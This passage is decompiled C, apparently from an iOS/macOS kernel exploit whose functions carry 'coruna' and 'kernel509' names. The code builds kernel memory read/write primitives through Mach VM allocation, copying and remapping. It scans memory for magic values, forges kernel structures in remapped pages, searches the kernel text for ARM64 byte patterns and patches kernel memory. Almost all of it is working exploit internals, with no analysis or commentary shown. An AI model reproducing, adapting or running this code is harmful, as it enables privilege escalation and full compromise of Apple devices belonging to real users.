  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x560),0xc000,lv5);
  coruna_vm_region_recurse_64(lv5);
  _vm_deallocate(*(vm_map_t *)ptr,*(long *)(handle + 0x578) + 0xc000,0x4000);
  lv5 = *(long *)(handle + 0x560) + 0x4000;
  bootargs = lv5;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x4000,0x4002);
  coruna_vm_remap_7d00(lv5,0x4000,0);
  bootargs = 0;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0xc000,1);
  *(vm_address_t *)(handle + 0x568) = bootargs;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x4000,0x4002);
  coruna_vm_remap_7d00(*(uint64_t *)(handle + 0x568),0x4000,0);
  lv5 = *(long *)(handle + 0x568) + 0x4000;
  bootargs = lv5;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x4000,0x4002);
  coruna_vm_remap_7d00(lv5,0x4000,0);
  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x458),*(vm_size_t *)(handle + 0x460),
           *(vm_address_t *)(handle + 0x450));
  if (*(unsigned long *)(handle + 0x460) == 0) {
    type_id_8 = 0xffffffffffffffff;
  }
  else {
    tag = 0;
    type_id_8 = 0xffffffffffffffff;
    do {
      handle = *(long *)(handle + 0x450) + tag;
      if (((*(byte *)(handle + 0x7f) & 1) == 0) && ((*(byte *)(handle + 0x17f) & 1) == 0)) {
        *(uint64_t *)(handle + 0x518) = *(uint64_t *)(handle + 0x148);
        type_id_8 = tag;
      }
      tag = tag + 0x4000;
    } while (tag < *(unsigned long *)(handle + 0x460));
  }
  bootargs = 0;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0xc000,1);
  *(vm_address_t *)(handle + 0x548) = bootargs;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x4000,0x4002);
  coruna_vm_remap_7d00(*(uint64_t *)(handle + 0x548),0x4000,0);
  bootargs = *(long *)(handle + 0x548) + 0x4000;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x8000,0x4000);
  handle = *(long *)(handle + 0x458) + type_id_8;
  *(long *)(handle + 0x550) = handle;
  bootargs = handle + 0x4000;
  _vm_allocate(*(vm_map_t *)ptr,&bootargs,0x8000,0x4000);
  lv5 = *(vm_address_t *)(handle + 0x458);
  handle = *(long *)(handle + 0x550);
  addr = *(long *)(handle + 0x460);
  _vm_deallocate(*(vm_map_t *)ptr,lv5,handle - lv5);
  _vm_deallocate(*(vm_map_t *)ptr,handle + 0xc000,((lv5 + addr) - handle) - 0x4000);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x450),
                 *(vm_size_t *)(handle + 0x460));
  *(long *)(handle + 0x450) = 0;
  *(uint64_t *)(handle + 0x458) = 0;
  size = k_kernel_rodata_word_00042e78;
  u = k_kernel_rodata_word_42e70;
  bootargs = 0;
  thread_attr = 0;
  json_buf = 0;
  json_buf = 0;
  frame = 0;
  frame = 0;
  plist = 0;
  plist = 0;
  url_buf = 0;
  url_buf = 0;
  tmp_buf = 0;
  region = 0;
  region = 0;
  sa_new = 0;
  sa_new = 0;
  path_buf = 0;
  stack_guard = 0;
  stack_guard = 0;
  action = 0;
  action = 0;
  block_ctx = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  serial_buf = 0;
  thread_attr = k_kernel_rodata_word_00042e78;
  bootargs = k_kernel_rodata_word_42e70;
  host_info = 100;
  sa_saved = 4;
  sa_saved = 0x101c80000000000;
  path_buf = 0xffffffffffffffff;
  type_id_8 = 0xffffffffffffff00;
  tmp_buf = 0xc008000000000;
  do {
    handle = type_id_8 + *(long *)(handle + 0x548);
    *(uint64_t *)(handle + 0x1c8) = 0;
    *(uint64_t *)(handle + 0x1c0) = 0;
    *(uint64_t *)(handle + 0x1d8) = 0;
    *(uint64_t *)(handle + 0x1d0) = 0;
    *(uint64_t *)(handle + 0x1e8) = 0;
    *(uint64_t *)(handle + 0x1e0) = 0;
    *(uint64_t *)(handle + 0x1f8) = 0;
    *(uint64_t *)(handle + 0x1f0) = 0;
    *(uint64_t *)(handle + 0x188) = 0;
    *(uint64_t *)(handle + 0x180) = 0;
    *(uint64_t *)(handle + 0x198) = 0xffffffffffffffff;
    *(uint64_t *)(handle + 400) = 0;
    *(uint64_t *)(handle + 0x1a8) = 0xc008000000000;
    *(uint64_t *)(handle + 0x1a0) = 0;
    *(uint64_t *)(handle + 0x1b8) = 0;
    *(uint64_t *)(handle + 0x1b0) = 0;
    *(uint64_t *)(handle + 0x148) = 0;
    *(uint64_t *)(handle + 0x140) = 0;
    *(uint64_t *)(handle + 0x158) = 0;
    *(uint64_t *)(handle + 0x150) = 0;
    *(uint64_t *)(handle + 0x168) = 0;
    *(uint64_t *)(handle + 0x160) = 0;
    *(uint64_t *)(handle + 0x178) = 0x101c80000000000;
    *(uint64_t *)(handle + 0x170) = 4;
    *(uint64_t *)(handle + 0x108) = u;
    *(uint64_t *)(handle + 0x100) = 0;
    *(uint64_t *)(handle + 0x118) = 0;
    *(uint64_t *)(handle + 0x110) = size;
    *(uint64_t *)(handle + 0x128) = 100;
    *(uint64_t *)(handle + 0x120) = 0;
    *(uint64_t *)(handle + 0x138) = 0;
    *(uint64_t *)(handle + 0x130) = 0;
    type_id_8 = type_id_8 + 0x100;
  } while (type_id_8 >> 8 < 0x3f);
  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x548),0xc000,
           *(vm_address_t *)(handle + 0x550));
  handle = 0;
  do {
    _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x58 + handle),0x4000);
    *(uint64_t *)(handle + 0x58 + handle) = 0;
    handle = handle + 0x10;
  } while (handle != 0x3e0);
  _bzero(*(void **)(handle + 0x548),0x4000);
  version = k_kernel_rodata_word_42f00;
  handle = *(long *)(handle + 0x518);
  type_id = 0;
  if (handle + 0x200 != 0) {
    type_id = (uint32_t)(handle + 0x2400000200U >> 6);
  }
  kind = 0;
  if (handle != -0x100) {
    kind = (uint32_t)(handle + 0x2400000100U >> 6);
  }
  port = 0;
  if (handle != 0) {
    port = (uint32_t)(handle + 0x2400000000U >> 6);
  }
  scratch = coruna_u64_pack((port), (port));
  scratch = coruna_u64_pack((0x4010001), (port));
  buf = *(uint64_t **)(handle + 0x548);
  buf[5] = k_kernel_rodata_word_42ef8;
  buf[4] = handle + 0x200;
  buf[7] = 0;
  buf[6] = 1;
  buf[1] = u;
  *buf = coruna_u64_pack((type_id), (type_id));
  buf[3] = 0x4000;
  buf[2] = size;
  buf[0xd] = 0;
  buf[0xc] = 0;
  buf[0xf] = 0x11c80000000000;
  buf[0xe] = 0;
  buf[9] = 0;
  buf[8] = 0;
  buf[0xb] = 0;
  buf[10] = 0;
  buf[0x15] = 0xc000700000000;
  buf[0x14] = 0;
  buf[0x17] = handle + 0xb8;
  buf[0x16] = 0;
  buf[0x11] = 0;
  buf[0x10] = 0;
  buf[0x13] = 0xffffffffffffffff;
  buf[0x12] = 0;
  buf[0x1d] = 0;
  buf[0x1c] = 0;
  buf[0x1f] = 0;
  buf[0x1e] = 0;
  buf[0x19] = 0;
  buf[0x18] = handle + 0xb8;
  buf[0x1b] = 0;
  buf[0x1a] = 0;
  buf[0x39] = 0;
  buf[0x38] = handle + 0xc80;
  buf[0x3b] = 0;
  buf[0x3a] = 0;
  buf[0x3d] = 0;
  buf[0x3c] = 0;
  buf[0x3f] = 0;
  buf[0x3e] = 0;
  buf[0x31] = 0;
  buf[0x30] = 0;
  buf[0x33] = 0xffffffffffffffff;
  buf[0x32] = 0;
  buf[0x35] = 0xc000700000000;
  buf[0x34] = 0;
  buf[0x37] = handle + 0xc80;
  buf[0x36] = 0;
  buf[0x29] = 0;
  buf[0x28] = 0;
  buf[0x2b] = 0;
  buf[0x2a] = 0;
  buf[0x2d] = 0;
  buf[0x2c] = 0;
  buf[0x2f] = 0x1880000000000;
  buf[0x2e] = 4;
  buf[0x21] = u;
  buf[0x20] = coruna_u64_pack((kind), (kind));
  buf[0x23] = 0x4000;
  buf[0x22] = size;
  buf[0x25] = version;
  buf[0x24] = 0;
  buf[0x27] = 0;
  buf[0x26] = 0;
  buf[0x41] = scratch;
  buf[0x40] = 0;
  buf[0x43] = 0;
  buf[0x42] = 0;
  buf[0x45] = 0x100c00000000;
  buf[0x44] = scratch;
  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x548),0xc000,
           *(vm_address_t *)(handle + 0x550));
  return;
}
void coruna_kernel509_via_vm_copy_88e0_2(uint64_t val,unsigned long arg,long *handle,long *addr_2)
{
  uint u;
  void *ptr;
  long handle;
  unsigned long size;
  unsigned long version;
  long addr;
  
  ptr = _malloc(0x4000);
  arg = -*(long *)k_kernel_vm_page_size_slot & arg;
  do {
    if (arg == 0) {
      addr = 0;
      handle = 0;
fail:
      *handle = handle;
      *addr_2 = addr;
      _free(ptr);
      return;
    }
    handle = coruna_bzero_2(val,arg);
    if (handle != 0) {
      coruna_vm_copy_88e0(val,handle,ptr,0x4000);
      size = 0;
      do {
        if (*(int *)((long)ptr + size) == -0x56fd80a0) {
          u = *(uint *)((long)ptr + size + 0xc);
          handle = (arg + size + 0xc & 0xfffffffffffff000) +
                  ((unsigned long)(*(uint *)((long)ptr + size + 0x10) >> 7) & 0x7ff8) +
                  (long)(int)(u >> 0x12 & 0x1800 | (u >> 5) << 0xd) * 2;
          u = *(uint *)((long)ptr + (size - 0x14));
          addr = ((arg + size) - 0x14 & 0xfffffffffffff000) +
                  ((unsigned long)(*(uint *)((long)ptr + (size - 0x10)) >> 7) & 0x7ff8) +
                  (long)(int)(u >> 0x12 & 0x1800 | (u >> 5) << 0xd) * 2;
          *handle = handle;
          *addr_2 = addr;
          _free(ptr);
          return;
        }
        version = size >> 3;
        size = size + 4;
      } while (version < 0x7ff);
    }
    arg = arg - 0x4000;
  } while( true );
}
void coruna_kernel509_via_vm_copy_88e0_3(uint64_t val,long handle,int flags,long *addr_2)
{
  long handle;
  uint8_t *ptr;
  void *ptr;
  unsigned long u;
  unsigned long size;
  long addr;
  unsigned long version;
  
  ptr = _malloc(0x4000);
  ptr = k_kernel_vm_page_size_slot;
  handle = -0x800000000000;
  if (handle != 0x10000000000) {
    handle = -0x8000000000;
  }
  handle = (unsigned long)(uint)(flags << 0xe) + handle;
  version = 0x3000000;
  addr = handle + 0x3000000;
  do {
    coruna_vm_copy_88e0(val,handle + version & -*(long *)ptr,ptr,0x4000);
    u = 0;
    do {
      if ((*(long *)((long)ptr + u + 0x10) == handle) &&
         (*(long *)((long)ptr + u + 0x18) == -1)) {
        *addr_2 = addr + u;
        _free(ptr);
        return;
      }
      size = u >> 3;
      u = u + 8;
    } while (size < 0x7e3);
    u = version >> 0xe;
    version = version + 0x4000;
    addr = addr + 0x4000;
    if (0xffe < u) {
fail:
      _free(ptr);
      return;
    }
  } while( true );
}
void coruna_kernel509_via_vm_copy_88e0_4(long handle)
{
  uint64_t u;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t action;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t stack_guard;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t sa_saved;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t sa_new;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t path_buf;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t tmp_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t region;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t plist;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t url_buf;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t json_buf;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t frame;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t work;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache_42;
  uint64_t cache;
  uint32_t cache_20;
  
  cache_20 = 0;
  coruna_vm_copy(handle,*(uint64_t *)(handle + 0x5a8),&cache_20);
  cache = 0;
  coruna_kernel509_via_vm_copy_88e0_3(handle,*(uint64_t *)(handle + 0x5a0),cache_20,&cache);
  cache_40 = 0;
  work = 0;
  cache_42 = 0;
  cache_41 = 0;
  cache_37 = 0;
  frame = 0;
  cache_39 = 0;
  cache_38 = 0;
  cache_34 = 0;
  json_buf = 0;
  cache_36 = 0;
  cache_35 = 0;
  cache_31 = 0;
  url_buf = 0;
  cache_33 = 0;
  cache_32 = 0;
  cache_28 = 0;
  plist = 0;
  cache_30 = 0;
  cache_29 = 0;
  cache_25 = 0;
  region = 0;
  cache_27 = 0;
  cache_26 = 0;
  cache_22 = 0;
  tmp_buf = 0;
  cache_24 = 0;
  cache_23 = 0;
  coruna_vm_copy_88e0(handle,cache,&tmp_buf,0xe0);
  *(uint64_t *)(handle + 0x520) = cache_22;
  *(uint64_t *)(handle + 0x528) = *(uint64_t *)(handle + 0x5b0);
  cache = 0;
  path_buf = 0;
  cache_21 = 0;
  cache_20 = 0;
  json_buf = 0;
  sa_new = 0;
  work = 0;
  frame = 0;
  region = 0;
  sa_saved = 0;
  url_buf = 0;
  plist = 0;
  sa_new = 0;
  stack_guard = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  block_ctx = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  action = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  serial_buf = 0;
  thread_attr = 0;
  bootargs = 0;
  coruna_kernel509_via_vm_copy_88e0(handle,plist,&serial_buf,0xe0);
  *(uint64_t *)(handle + 0x530) = block_ctx;
  thread_attr = 0;
  host_info = 0;
  coruna_kernel509_via_vm_copy_88e0_2(handle,block_ctx,&host_info,&thread_attr);
  bootargs = 0;
  u = coruna_bzero_2(handle,host_info);
  coruna_vm_copy_88e0(handle,u,&bootargs,8);
  *(uint64_t *)(handle + 0x538) = bootargs;
  scratch = 0;
  u = coruna_bzero_2(handle,thread_attr);
  coruna_vm_copy_88e0(handle,u,&scratch,8);
  *(uint64_t *)(handle + 0x540) = scratch;
  return;
}





void coruna_vm_deallocate_af48(long handle)
{
  _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*(vm_address_t *)(handle + 0x438),
                 *(vm_size_t *)(handle + 0x448));
  *(uint64_t *)(handle + 0x438) = 0;
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x5b8),*(uint64_t *)(handle + 0x5d0),
               *(uint64_t *)(handle + 0x440));
}
void coruna_kernel509_residual_285(long handle,long addr_2)
{
  unsigned long u;
  
  u = 0;
  do {
    if (u < *(unsigned long *)(addr_2 + 0x20)) {
      coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x5c0),*(uint64_t *)(handle + 0x5d0),
                   *(uint32_t *)(addr_2 + 0x14 + u * 4));
    }
    u = u + 1;
  } while (u != 3);
  return;
}
void coruna_kernel509_residual_286(long handle)
{
  bool err;
  bool status;
  uint64_t *ptr;
  void *ptr;
  long handle;
  long addr;
  long off;
  long scratch [3];
  
  handle = 0;
  scratch[2] = *(long *)k_kernel_stack_chk_guard_slot;
  addr = handle + 0x468;
  scratch[0] = addr;
  scratch[1] = handle + 0x490;
  while( true ) {
    ptr = *(uint64_t **)(addr + 0x18);
    if (ptr != (uint64_t *)0x0) {
      *(uint64_t *)(addr + 0x18) = *ptr;
      coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x5b8),*(uint64_t *)(handle + 0x5d0),ptr[3]);
    }
    off = 0;
    err = true;
    do {
      status = err;
      ptr = *(void **)(addr + off * 8);
      coruna_kernel509_residual_285(handle,(long)ptr + 0x10);
      if (off != *(long *)(addr + 0x10) || addr == handle + 0x490) {
        coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x5b8),*(uint64_t *)(handle + 0x5d0),
                     *(uint64_t *)((long)ptr + 0x38));
      }
      _free(ptr);
      off = 1;
      err = false;
    } while (status);
    handle = handle + 1;
    if (handle == 2) break;
    addr = scratch[handle];
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == scratch[2]) {
    return;
  }
  ___stack_chk_fail();
}





void coruna_call_indirect_b0fc(long handle,long addr_2)
{
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x5b8),*(uint64_t *)(handle + 0x5d0),
               *(uint64_t *)(addr_2 + 0x18));
}





void coruna_call_indirect_b0fc_b29c(long handle,long addr_2)
{
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x5b8),*(uint64_t *)(handle + 0x5d0),
               *(uint64_t *)(addr_2 + 0x18));
}





void coruna_call_indirect_b0fc_b364(long handle,long addr_2)
{
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x5b8),*(uint64_t *)(handle + 0x5d0),
               *(uint64_t *)(addr_2 + 0x18));
}





void coruna_call_indirect_b0fc_b468(long handle,long addr_2)
{
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x5b8),*(uint64_t *)(handle + 0x5d0),
               *(uint64_t *)(addr_2 + 0x40));
}





void coruna_call_indirect_b0fc_b5e8(long handle,long addr_2)
{
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x5b8),*(uint64_t *)(handle + 0x5d0),
               *(uint64_t *)(addr_2 + 0x68));
}





void coruna_kernel509_residual_287(long handle,long addr_2)
{
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t host_info;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t serial_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t action;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t block_ctx;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t stack_guard;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  
  cache_22 = 0;
  stack_guard = 0;
  cache_24 = 0;
  cache_23 = 0;
  cache = 0;
  block_ctx = 0;
  cache_21 = 0;
  cache_20 = 0;
  json_buf = 0;
  action = 0;
  work = 0;
  frame = 0;
  region = 0;
  serial_buf = 0;
  url_buf = 0;
  plist = 0;
  sa_new = 0;
  host_info = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  thread_attr = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  bootargs = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(*(long *)(handle + 0x5d0) + 0x30),*(long *)(handle + 0x5d0),
               *(long *)(addr_2 + 0x10) - *(long *)(handle + 0x540),&scratch,0x100,1);
}





void coruna_kernel509_via_call_indirect_b0fc_b29c(long handle)
{
  long handle;
  long addr;
  uint64_t *ptr;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t serial_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t action;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t block_ctx;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t stack_guard;
  uint64_t cache_20;
  uint64_t sa_saved;
  uint64_t cache_21;
  uint64_t sa_new;
  uint64_t cache_22;
  long *path_buf;
  long tmp_buf;
  uint64_t region;
  
  region = *(uint64_t *)k_kernel_stack_chk_guard_slot;
  addr = *(long *)(handle + 0x5d0);
  tmp_buf = handle + 0x4d8;
  path_buf = (long *)(handle + 0x4b8);
  while (ptr = *(uint64_t **)(handle + 0x4c0), ptr != (uint64_t *)0x0) {
    *(uint64_t *)(handle + 0x4c0) = *ptr;
    handle = ptr[1];
    if (handle < 4) {
      if (handle == 1) {
        coruna_call_indirect_b0fc(handle,ptr);
      }
      else if (handle == 2) {
        coruna_call_indirect_b0fc_b29c(handle,ptr);
      }
      else if (handle == 3) {
        coruna_call_indirect_b0fc_b364(handle,ptr);
      }
    }
    else if (handle == 4) {
      coruna_call_indirect_b0fc_b468(handle,ptr);
    }
    else if (handle == 5) {
      coruna_call_indirect_b0fc_b5e8(handle,ptr);
    }
    else if (handle == 6) {
      coruna_kernel509_residual_287(handle,ptr);
    }
    coruna_kernel509_residual_285(handle,ptr + 2);
    coruna_kernel509_residual_285(handle,ptr + 7);
    coruna_kernel509_residual_285(handle,ptr + 0xc);
    _free(ptr);
  }
  cache_22 = 0;
  sa_new = 0;
  cache_21 = 0;
  sa_saved = 0;
  cache_20 = 0;
  stack_guard = 0;
  frame = 0;
  block_ctx = 0;
  cache = 0;
  work = 0;
  plist = 0;
  action = 0;
  json_buf = 0;
  url_buf = 0;
  path_buf = 0;
  serial_buf = 0;
  region = 0;
  tmp_buf = 0;
  stack_guard = 0;
  host_info = 0;
  sa_new = 0;
  sa_saved = 0;
  serial_buf = 0;
  thread_attr = 0;
  block_ctx = 0;
  action = 0;
  bootargs = 0;
  bootargs = 0;
  host_info = 0;
  thread_attr = 0;
  scratch = 0;
  scratch = 0;
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(addr + 0x30),addr,
               *(long *)(*(long *)(handle + 0x4b8) + 0x10) - *(long *)(handle + 0x540),&scratch,
               0x100,1);
}





void coruna_vm_deallocate_bf04(long *handle)
{
  long *ptr;
  
  ptr = (long *)*handle;
  while (ptr != (long *)0x0) {
    *handle = *ptr;
    coruna_vm_deallocate_94b0();
    ptr = (long *)*handle;
  }
  _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,handle[4],
                 handle[0xb3] * 0x4000 + 0xc000);
  handle[4] = 0;
  coruna_vm_deallocate_af48(handle);
  coruna_kernel509_residual_286(handle);
  coruna_kernel509_via_call_indirect_b0fc_b29c(handle);
  coruna_kernel509_via_helper_5d2c_419fc_2(handle[0xb9],handle[0xba],handle[0xaa]);
}
void coruna_vm_deallocate_bfc0(void *ctx)
{
  uint8_t *ptr;
  
  *(uint64_t *)((long)ctx + 0x580) = 0;
  ptr = k_kernel_mach_task_self_slot;
  _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*(vm_address_t *)((long)ctx + 0x548)
                 ,0xc000);
  *(uint64_t *)((long)ctx + 0x548) = 0;
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ctx + 0x550),0xc000);
  *(uint64_t *)((long)ctx + 0x550) = 0;
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ctx + 0x560),0xc000);
  *(uint64_t *)((long)ctx + 0x560) = 0;
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ctx + 0x568),0xc000);
  *(uint64_t *)((long)ctx + 0x568) = 0;
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ctx + 0x578),0xc000);
  *(uint64_t *)((long)ctx + 0x578) = 0;
  _bzero(ctx,0x5e8);
  _free(ctx);
  return;
}
void coruna_kernel509_str_08_3d_40_92_09_18_80_52(long handle)
{
  int err;
  long handle;
  long addr;
  long off;
  uint8_t scratch[24];
  uint8_t bootargs[28];
  int thread_attr;
  long host_info;
  int serial_buf;
  int action;
  uint64_t block_ctx;
  uint8_t *stack_guard;
  long sa_saved;
  
  sa_saved = 0;
  block_ctx = 0;
  stack_guard = (uint8_t *)0x0;
  coruna_macho_text_sect(bootargs,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
  handle = coruna_strsep(bootargs,"08 3D 40 92 09 18 80 52",0,1);
  if ((handle != 0) &&
     (handle = coruna_ret_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + 8), handle != 0)) {
    err = coruna_kernel509_residual_307(handle,&UNK_00001bc0 + handle,&stack_guard);
    if ((err != 0) &&
       ((((&UNK_00001bc0 + handle == stack_guard &&
          (err = coruna_kernel509_residual_307(handle,&UNK_00001bd0 + handle,&sa_saved), err != 0)) &&
         (sa_saved + 0x1000000000000U < 0xffffffffefff)) &&
        ((err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,sa_saved,4,&serial_buf), err != 0 && (serial_buf == 0x6f206d76)
         ))))) {
      err = coruna_kernel509_residual_307(handle,handle + 0x1c00,&block_ctx);
      if ((err != 0) && (addr = coruna_fn_ptr_cast_2(handle,block_ctx), addr == 0)) {
        coruna_macho_text_sect(scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
        addr = coruna_strsep(scratch,"1F 01 0A EB 41 00 00 54 C0 03 5F D6 .. .. .. F9",0,1);
        if ((addr != 0) &&
           (addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + -8), addr != 0))
        {
          off = coruna_helper_127b4_1b298(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
          err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,&UNK_00001c68 + handle,4,&action);
          if ((err != 0) && (action != 0)) {
            thread_attr = action << 1;
            err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,&UNK_00001c08 + handle,&thread_attr,4);
            if (err != 0) {
              host_info = off + 0xcccc;
              err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,addr,&host_info,4);
              if (err != 0) {
                coruna_semaphore_timedwait(handle,0x1312d0);
                err = coruna_kernel509_residual_307(handle,handle + 0x1c00,&block_ctx);
                if (err != 0) {
                  addr = coruna_fn_ptr_cast_2(handle,block_ctx);
                  if (addr == 0) {
                    thread_attr = 0;
                    err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,&UNK_00001c08 + handle,&thread_attr,4);
                    if (err == 0) {
                      return;
                    }
                  }
                  coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,&UNK_00001c68 + handle,4,&action);
                }
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_vm_copy_88e0(long handle,uint64_t val,uint64_t id_2,uint32_t size,int flags)
{
  int err;
  long handle;
  uint32_t scratch;
  
  scratch = 0xffffffff;
  handle = *(long *)(handle + 0x50);
  if (handle != 0) {
    if (flags == 0) {
      coruna_kernel509_via_vm_copy_88e0(handle,val,id_2,size);
    }
    else {
      err = coruna_open_dev_null(&scratch);
      if (err == 0) {
        coruna_kernel509_via_vm_copy_88e0(handle,val,id_2,size);
        coruna_close(scratch);
      }
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_vm_copy_8988(long handle,uint64_t val,uint64_t id_2,uint32_t size,int flags)
{
  int err;
  long handle;
  uint32_t scratch;
  
  scratch = 0xffffffff;
  handle = *(long *)(handle + 0x50);
  if (handle != 0) {
    if (flags == 0) {
      coruna_kernel509_via_vm_copy_8988(handle,id_2,val,size);
    }
    else {
      err = coruna_open_dev_null(&scratch);
      if (err == 0) {
        coruna_kernel509_via_vm_copy_8988(handle,id_2,val,size);
        coruna_close(scratch);
      }
    }
  }
  return;
}
void coruna_kernel509_via_vm_copy_88e0_5(long handle,unsigned long arg,uint64_t val,uint size,int flags)
{
  int err;
  long handle;
  uint32_t scratch;
  
  scratch = 0xffffffff;
  handle = *(long *)(handle + 0x50);
  if ((handle != 0) &&
     ((*(unsigned long *)k_kernel_vm_page_mask_slot & arg) + (unsigned long)size <=
      *(unsigned long *)k_kernel_vm_page_size_slot)) {
    if (flags == 0) {
      coruna_vm_copy_88e0(handle,arg,val,size);
    }
    else {
      err = coruna_open_dev_null(&scratch);
      if (err == 0) {
        coruna_vm_copy_88e0(handle,arg,val,size);
        coruna_close(scratch);
      }
    }
  }
  return;
}
void coruna_kernel509_via_vm_copy_8988_2(long handle,unsigned long arg,uint64_t val,uint size,int flags)
{
  int err;
  long handle;
  uint32_t scratch;
  
  scratch = 0xffffffff;
  handle = *(long *)(handle + 0x50);
  if ((handle != 0) &&
     ((*(unsigned long *)k_kernel_vm_page_mask_slot & arg) + (unsigned long)size <=
      *(unsigned long *)k_kernel_vm_page_size_slot)) {
    if (flags == 0) {
      coruna_vm_copy_8988(handle,val,arg,size);
    }
    else {
      err = coruna_open_dev_null(&scratch);
      if (err == 0) {
        coruna_vm_copy_8988(handle,val,arg,size);
        coruna_close(scratch);
      }
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_mach_port_deallocate(uint *size)
{
  uint u;
  int err;
  void *ptr;
  long *buf;
  uint64_t size;
  uint64_t version;
  uint64_t scratch;
  uint64_t scratch;
  long bootargs;
  uint64_t bootargs;
  
  err = coruna_fn_ptr_cast_10(size,0x20);
  if (err != 0) {
    u = *size & 0x518e241;
